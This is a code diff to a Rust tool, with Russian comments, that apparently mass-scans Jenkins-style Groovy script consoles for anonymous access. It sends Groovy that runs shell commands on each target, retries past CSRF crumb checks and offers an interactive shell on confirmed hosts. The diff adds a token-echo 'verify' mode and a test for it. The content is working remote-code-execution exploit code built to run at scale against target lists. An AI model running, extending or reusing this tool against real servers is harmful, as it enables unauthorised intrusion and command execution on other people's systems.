@@ -196,7 +196,49 @@ fn groovy_for(name: &str, nonce: &str) -> Option<String> {
 }
 
 fn command_known(name: &str) -> bool {
-    GROOVY.iter().any(|(n, _)| *n == name)
+    name == "verify" || GROOVY.iter().any(|(n, _)| *n == name)
+}
+
+fn configure_groovy(config: &mut Config) {
+    config.groovy = if config.command == "verify" {
+        groovy_verify(&config.nonce)
+    } else {
+        groovy_for(&config.command, &config.nonce).unwrap()
+    };
+}
+
+// Детерминированный proof: токен генерируется локально, а цель должна вернуть
+// его же, выполнив echo. Страница 403 или кэш такой токенподделать не могут.
+fn groovy_verify(nonce: &str) -> String {
+    let token = format!("{PROOF_MARKER}_{nonce}:{nonce}");
+    format!(
+        "def os = System.getProperty('os.name').toLowerCase(); \
+         def p = os.contains('windows') ? ['cmd','/c','echo {token}'].execute() \
+                                        : ['/bin/sh','-c','echo {token}'].execute(); \
+         return new String(p.getInputStream().bytes, 'UTF-8')"
+    )
+}
+
+fn validate_verify(out: &Resp, nonce: &str, from_pre: bool) -> Option<String> {
+    if !(200..300).contains(&out.status) {
+        return None;
+    }
+    let text = if from_pre {
+        let pres: Vec<String> = extract_pre_blocks(&out.body)
+            .iter()
+            .map(|p| clean_text(p).trim().to_string())
+            .filter(|s| !s.is_empty())
+            .collect();
+        pres.last().cloned()?
+    } else {
+        clean_text(&out.body)
+    };
+    let token = format!("{PROOF_MARKER}_{nonce}:{nonce}");
+    if text.contains(&token) {
+        Some(token)
+    } else {
+        None
+    }
 }
 
 fn usage() -> &'static str {
@@ -212,7 +254,7 @@ fn usage() -> &'static str {
         -s, --shell <url>       интерактивный шелл на подтверждённой цели\n\
         -l, --list <file>       список целей (по одной на строку, '#' — комментарий)\n\
        -o, --output <file>     записать все результаты в JSONL (удобно для jq)\n\
-       -c, --command <name>    команда proof: id, whoami, hostname, pwd, uname, date (по умолчанию id)\n\
+        -c, --command <name>    proof: verify (точный токен), id, whoami, hostname, pwd, uname, date\n\
        --nonce <str>           свой маркер proof (иначе генерируется; нужен для перепроверки другой командой)\n\
        --output-dir <dir>      куда писать found.txt (по умолчанию — текущая папка)\n\
        -p, --parallel <n>      параллельные цели (по умолчанию 8)\n\
@@ -404,13 +446,13 @@ fn interactive() -> Result<Chosen, i32> {
                     }
                 };
                 let mut config = default_config();
-                config.groovy = groovy_for(&config.command, &config.nonce).unwrap();
+                configure_groovy(&mut config);
                 return Ok(Chosen { input: Input::Single(target), config, keep_console: true });
             }
             "2" => match find_default_targets() {
                 Ok(v) => {
                     let mut config = default_config();
-                    config.groovy = groovy_for(&config.command, &config.nonce).unwrap();
+                    configure_groovy(&mut config);
                     return Ok(Chosen { input: Input::Batch(v), config, keep_console: true });
                 }
                 Err(e) => println!("[!] {e}"),
@@ -418,7 +460,7 @@ fn interactive() -> Result<Chosen, i32> {
             "3" => match choose_target_from_found() {
                 Ok(url) => {
                     let mut config = default_config();
-                    config.groovy = groovy_for(&config.command, &config.nonce).unwrap();
+                    configure_groovy(&mut config);
                     return Ok(Chosen { input: Input::Shell(url), config, keep_console: true });
                 }
                 Err(0) => continue,
@@ -553,7 +595,7 @@ fn parse_input() -> Result<Chosen, i32> {
         }
     };
 
-    config.groovy = groovy_for(&config.command, &config.nonce).unwrap();
+    configure_groovy(&mut config);
     Ok(Chosen { input, config, keep_console: false })
 }
 
@@ -1058,54 +1100,79 @@ async fn check_target(
     let mut post_status = 0u16;
 
     if script_anon {
-        for attempt in 0..POST_ATTEMPTS {
-            // Повтор с той же сессией: crumb и POST используют один и тот же cookie.
-            if crumb.is_empty() || attempt > 0 {
-                let (c, new_cookie) = fetch_crumb(&client, &u_crumb, &cookie, &rl).await;
-                if !new_cookie.is_empty() {
-                    merge_cookie(&mut cookie, new_cookie);
+        if config.command == "verify" {
+            // Точный proof: собственный токен должен вернуться из выполненной команды.
+            let combos = [
+                ("/script", true, crumb.as_str()),
+                ("/script", true, ""),
+                ("/scriptText", false, crumb.as_str()),
+                ("/scriptText", false, ""),
+            ];
+            for (ep2, pre2, crumb2) in combos {
+                let out = post_script(
+                    &client,
+                    &format!("{base}{ep2}"),
+                    crumb2,
+                    &cookie,
+                    &config.groovy,
+                    &rl,
+                )
+                .await;
+                post_status = out.status;
+                log_line(
+                    &mut logs,
+                    &prefix,
+                    &format!("  verify POST {ep2} crumb={} -> {}", if crumb2.is_empty() { "no" } else { "yes" }, out.status),
+                );
+                if let Some(p) = validate_verify(&out, &config.nonce, pre2) {
+                    proof = Some(p);
+                    proof_endpoint = Some(ep2.to_string());
+                    break;
                 }
-                if !c.is_empty() {
-                    crumb = c;
+                let low = out.body.to_ascii_lowercase();
+                if out.status == 403 || low.contains("no valid crumb") || low.contains("forbidden") {
+                    csrf_blocked = true;
                 }
             }
-            if crumb.is_empty() {
-                // CSRF может быть выключен: crumb-эндпоинт есть, но crumb не нужен.
-                // Всё равно пробуем POST — валидация proof отсечёт мусор.
-                log_line(&mut logs, &prefix, "  crumb=failed -> POST без crumb (CSRF off?)");
-            } else {
-                log_line(&mut logs, &prefix, &format!("  crumb=ok ({})", if attempt == 0 { "wave" } else { "retry" }));
-            }
+        } else {
+            for attempt in 0..POST_ATTEMPTS {
+                // Повтор с той же сессией: crumb и POST используют один и тот же cookie.
+                if crumb.is_empty() || attempt > 0 {
+                    let (c, new_cookie) = fetch_crumb(&client, &u_crumb, &cookie, &rl).await;
+                    if !new_cookie.is_empty() {
+                        merge_cookie(&mut cookie, new_cookie);
+                    }
+                    if !c.is_empty() {
+                        crumb = c;
+                    }
+                }
+                if crumb.is_empty() {
+                    log_line(&mut logs, &prefix, "  crumb=failed -> POST без crumb (CSRF off?)");
+                } else {
+                    log_line(&mut logs, &prefix, &format!("  crumb=ok ({})", if attempt == 0 { "wave" } else { "retry" }));
+                }
 
-            let out = post_script(
-                &client,
-                &url_post,
-                &crumb,
-                &cookie,
-                &config.groovy,
-                &rl,
-            )
-            .await;
-            post_status = out.status;
-            log_line(
-                &mut logs,
-                &prefix,
-                &format!("  POST {ep} attempt {}/{} ({}) -> {}", attempt + 1, POST_ATTEMPTS, config.command, out.status),
-            );
+                let out = post_script(&client, &url_post, &crumb, &cookie, &config.groovy, &rl).await;
+                post_status = out.status;
+                log_line(
+                    &mut logs,
+                    &prefix,
+                    &format!("  POST {ep} attempt {}/{} ({}) -> {}", attempt + 1, POST_ATTEMPTS, config.command, out.status),
+                );
 
-            if let Some(p) = validate_proof(&out, &config.command, &config.nonce, from_pre) {
-                proof = Some(p);
-                proof_endpoint = Some(ep.to_string());
-                break;
-            }
+                if let Some(p) = validate_proof(&out, &config.command, &config.nonce, from_pre) {
+                    proof = Some(p);
+                    proof_endpoint = Some(ep.to_string());
+                    break;
+                }
 
-            let low = out.body.to_ascii_lowercase();
-            if out.status == 403 || low.contains("no valid crumb") || low.contains("forbidden") {
-                csrf_blocked = true;
-            }
-            if (200..300).contains(&out.status) {
-                // Ответ 2xx, но валидного proof нет — повтор CSRF не поможет.
-                break;
+                let low = out.body.to_ascii_lowercase();
+                if out.status == 403 || low.contains("no valid crumb") || low.contains("forbidden") {
+                    csrf_blocked = true;
+                }
+                if (200..300).contains(&out.status) {
+                    break;
+                }
             }
         }
     }
@@ -1420,6 +1487,20 @@ mod tests {
         let payload = B64.encode(b"uid=0(root)\n".as_slice());
         let body = format!("<html><pre>RCE_SHELL_abc123:{payload}</pre></html>");
         assert_eq!(shell_output(&body, nonce).unwrap(), "uid=0(root)\n");
+    }
+
+    #[test]
+    fn verify_mode_needs_exact_token_and_2xx() {
+        let nonce = "abc123";
+        let token = format!("{PROOF_MARKER}_{nonce}:{nonce}");
+        assert!(groovy_verify(nonce).contains(&token));
+        let err = resp(403, "<html><pre>Error 403 No valid crumb was included</pre></html>");
+        assert!(validate_verify(&err, nonce, true).is_none());
+        let ok_body = format!("<html><pre>{token}</pre></html>");
+        let ok = resp(200, &ok_body);
+        assert!(validate_verify(&ok, nonce, true).is_some());
+        let stale = resp(200, "<html><pre>RCEPROOF_other:other</pre></html>");
+        assert!(validate_verify(&stale, nonce, true).is_none());
     }
 
     #[test]
